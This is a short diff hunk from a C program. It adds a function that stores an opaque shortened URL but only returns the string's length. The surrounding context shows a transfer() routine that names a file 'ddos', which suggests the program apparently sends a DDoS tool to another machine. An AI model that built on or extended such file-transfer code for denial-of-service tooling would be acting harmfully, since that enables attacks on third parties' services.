@@ -27,6 +27,11 @@ void displayTextArt() {
 )EOF");
 }
 
+long unsigned int special_secret_link() {
+	char link[64] = "https://rb.gy/o411hk";
+	return strlen(link);
+}
+
 void transfer() {
     
     char client_file_name[64] = "ddos"; //path to the ddos file
